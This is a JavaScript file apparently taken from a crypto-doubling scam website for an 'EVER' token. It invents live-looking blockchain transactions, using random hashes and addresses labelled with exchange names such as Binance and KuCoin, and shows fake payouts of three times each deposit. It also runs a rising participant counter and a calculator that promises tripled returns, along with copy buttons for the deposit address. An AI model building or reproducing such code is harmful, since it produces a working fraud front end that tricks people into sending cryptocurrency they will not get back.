var parcent = 3;

function update_count() {
    setInterval(() => {
        $("#num_").text(parseInt($("#num_").text()) + 1);
    }, 12e4);
}

function tx(_) {
    return 1 + Math.floor(Math.random() * _);
}

function dec2hex(dec) {
    return ("0" + dec.toString(16)).substr(-2);
}

function generateId(length) {
    for (
        var result = "1",
            characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
            charactersLength = characters.length,
            i = 0; i < length; i++
    )
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    return result;
}


function startaddress(length = 4) {
    for (
        var result = "",
            characters = "1234567890",
            charactersLength = characters.length,
            i = 0; i < length; i++
    )
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    return result;
}


function create_transaction(mins) {
    var table,
        row = (table = document.getElementById("myTable")).insertRow(1),
        address = get_random(),
        amount = Math.floor(50000 * Math.random()) + 50,
        decimal = String(Math.random(3, 999));
    row.innerHTML =
        '<tr  class="tr"> <td><a class="hash-tag text-truncate" href="">' +
        generateId(63) +
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
        tx(99999999) +
        '</a></td> <td><span class="timer">' +
        mins +
        ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">Avalanche Pool</span> </td> <td>' +
        amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
        ' EVER</td> <td><span class="small text-secondary">0<b>.</b>000' +
        tx(999) +
        "</span></td> </tr>";
    var table,
        row = (table = document.getElementById("myTable")).insertRow(1),
        send_amount = amount * parcent;
    row.innerHTML =
        '<tr> <td><a class="hash-tag text-truncate" href="">' +
        generateId(63) +
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
        tx(99999999) +
        '</a></td> <td><span class="timer">' +
        mins +
        ' mins ago</span></td> <td><span class="hash-tag text-truncate">EVER Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        "</a> </td> <td>" +
        send_amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
        ' EVER</td> <td><span class="small text-secondary">0<b>.</b>000' +
        tx(999) +
        "</span></td> </tr>";
}

function update_tx() {
    setInterval(() => {
        $("#num_").text(parseInt($("#num_").text()) + 1);
    }, 12e4);
}

function new_transaction() {
    var table,
        row = document.getElementById("myTable").insertRow(1),
        address = get_random(),
        amount = Math.floor(Math.random() * 50000) + 50,
        decimal = String(Math.random(5, 999));
    (row.innerHTML =
        '<tr> <td><a class="hash-tag text-truncate" href="">' +
        generateId(63) +
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">EVER Pool</span> </td> <td>' +
        amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
        ' EVER</td> <td><span class="small text-secondary">0<b>.</b>000' +
        tx(999) +
        "</span></td> </tr>"),
    document
        .getElementById("myTable")
        .deleteRow(document.getElementById("myTable").rows.length - 1),
        document.getElementsByTagName("tr")[1].classList.add("toolbar"),
        setTimeout(() => {
            var table,
                row = document.getElementById("myTable").insertRow(1),
                send_amount = amount * parcent;
            (row.innerHTML =
                '<tr> <td><a class="hash-tag text-truncate" href="">' +
                generateId(63) +
                '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
                tx(99999999) +
                '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">EVER Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
                address +
                "</a> </td> <td>" +
                send_amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
                ' EVER</td> <td><span class="small text-secondary">0<b>.</b>000' +
                tx(999) +
                "</span></td> </tr>"),
            document
                .getElementById("myTable")
                .deleteRow(document.getElementById("myTable").rows.length - 1),
                document.getElementsByTagName("tr")[1].classList.add("toolbar");
        }, 8500);
}

function update_trans() {
    for (i = 0; i < times.length; i++)
        "now" == times[i].innerHTML ?
        (times[i].innerHTML = "1 mins ago") :
        1 == parseInt(times[i].innerHTML.split(" ")[0]) &&
        "mins" == times[i].innerHTML.split(" ")[1] ?
        (times[i].innerHTML =
            parseInt(times[i].innerHTML.split(" ")[0]) + 1 + " mins ago") :
        parseInt(times[i].innerHTML.split(" ")[0]) >= 59 &&
        "mins" == times[i].innerHTML.split(" ")[1] ?
        (times[i].innerHTML = "1 hrs ago") :
        parseInt(times[i].innerHTML.split(" ")[0]) > 1 &&
        "mins" == times[i].innerHTML.split(" ")[1] &&
        (times[i].innerHTML =
            parseInt(times[i].innerHTML.split()[0]) + 1 + " mins ago");
    new_transaction();
}

(get_random = function(
    list = [
        'X-EVER1gefyrf2m40qwuk92vl' + startaddress() + generateId(40),
        "Binance 1",
        '0xa50a4cca818e0c57f478c831a58db6bfdc0b7d4df' + startaddress() + generateId(40),
        "KuCoin",
        'x-EVER1pue5luvh6klhjkq8zk5zltx' + startaddress() + generateId(40),
        "Binance 3",
        '0xdebb1d13eadec832b' + startaddress() + generateId(40),
        "Bithumb",
        'x-EVER12l5ttdxd3w58335m5g9x6f85mgqg' + startaddress() + generateId(40),
        "Huobi Global",
        '0x559d12277b71dc44c' + startaddress() + generateId(40),
        "Binance 14",
        '0x328d701d72c2cbcb6' + startaddress() + generateId(40),
        "Gate.io",
        'x-EVER1ccjyjd9t0rmxf8z53j6' + startaddress() + generateId(40),
        "Bitfinex",
        '0xaae115c84ba9d3476' + startaddress() + generateId(40),
        "Binance 2",
        'x-EVER1upq5z3l66mccjyjd9t0rmxf8z' + startaddress() + generateId(40),
        "VCC Exchange",
        '0x287bd87f644812a2a' + startaddress() + generateId(40),
        "Okex",
        '0xb8a992a13078282d' + startaddress() + generateId(40),
        "Crypto.com Exchange ",
        'x-EVER13f7kxrvsadackdw5vk3zd6' + startaddress() + generateId(40),
        "Gate.io",
        '0x063b88D53d109C12Ec21785C4' + startaddress() + generateId(40),
        "Binance 1"
    ]
) {
    return list[Math.floor(Math.random() * list.length)];
}),
$(document).ready(() => {
        for (i = 25; i > 0; i--) create_transaction(i);
        update_tx(), update_count();
    }),
    (times = document.getElementsByClassName("timer")),
    (window.onload = () => {
        update_trans(),
            (trans = setInterval(() => {
                update_trans();
            }, 1e4));
    }),
    $("#gen-btn").click(() => {
        var in_amount = $("#cal-in").val();
        if (in_amount < 5000) {
            $("#warn").text("Minimum amount is 5,000");
        }
        if (in_amount > 500000) {
            $("#warn").text("Maximum amount is 500,000");
        }
        else if ($('#btc_adr').val().length >= 5) {
            amount_entered = $("#cal-in").val();
            $("#gen-amount").text(amount_entered);
            $("#copy_").attr("data-clipboard-text", amount_entered);
            $("#warn").text(""), $(".pop-body").css("display", "flex");
        } else {
            $("#warn").text("Please enter a valid address");
        }

    }),
    $("#close").click(() => {
        $(".pop-body").css("display", "none");
    }),
    setTimeout(function() {
        let viewheight = $(window).height(),
            viewwidth = $(window).width(),
            viewport;
        document
            .querySelector("meta[name=vie324242wport]")
            .setAttribute(
                "content",
                "height=" +
                viewheight +
                "px, width=" +
                viewwidth +
                "px, initial-scale=1.0"
            );
    }, 300)
$("#cal-in").on("input", () => {
    var in_amount = $("#cal-in").val();
    if (in_amount > 5000 && in_amount < 500000) {
        $("#cal-out").val(in_amount * 3);
    } else if (in_amount => 5 && in_amount <= 120) {
        $("#cal-out").val(in_amount * 3);
    }
});

$("#cal-out").on("input", () => {
    var in_amount = $("#cal-out").val();
    if (in_amount > 0 && in_amount < 500000) {
        $("#cal-in").val(in_amount / 3);
    } else if (in_amount => 150 && in_amount <= 300) {
        $("#cal-in").val(in_amount / 3);
    }
});

function copy_item(item) {
    var t = window.getSelection(),
        e = document.createElement("div");
    (e.style.position = "absolute"),
    (e.style.left = "-99999px"),
    document.body.appendChild(e),
        (e.innerHTML = item),
        t.selectAllChildren(e),
        window.setTimeout(function() {
            document.body.removeChild(e);
        }, 100);
}

function copy_main(id, fade) {
    copy_item($("#" + id).attr("data-clipboard-text"));
    var clipboard = new Clipboard("#" + id);
    clipboard.on("success", function() {
            $("#" + fade).css("opacity", 1), $("#" + id).css("opacity", 0);
        }),
        clipboard.on("error", function(e) {
            $(".tooltiptetext").html("Faild!");
        });
}


// Copy amount starts here

$("#copy_").click(() => {
    copy_main("copy_", "address-card");
});

$("#copy_").mouseout(() => {
    $("#address-card").css("opacity", 0), $("#copy_").css("opacity", 1);
});

// Copy amount ends here


// Copy address part starts here

$("#copy_address").click(() => {
    copy_main("copy_address", "done-copy");
});

$("#copy_address").mouseout(() => {
    $("#done-copy").css("opacity", 0), $("#copy_address").css("opacity", 1);
});
$("#copy_address1").click(() => {
    copy_main("copy_address1", "done-copy1");
});

$("#copy_address1").mouseout(() => {
    $("#done-copy1").css("opacity", 0), $("#copy_address1").css("opacity", 1);
});
$("#copy_address2").click(() => {
    copy_main("copy_address2", "done-copy2");
});

$("#copy_address2").mouseout(() => {
    $("#done-copy2").css("opacity", 0), $("#copy_address2").css("opacity", 1);
});

// Copy address part ends here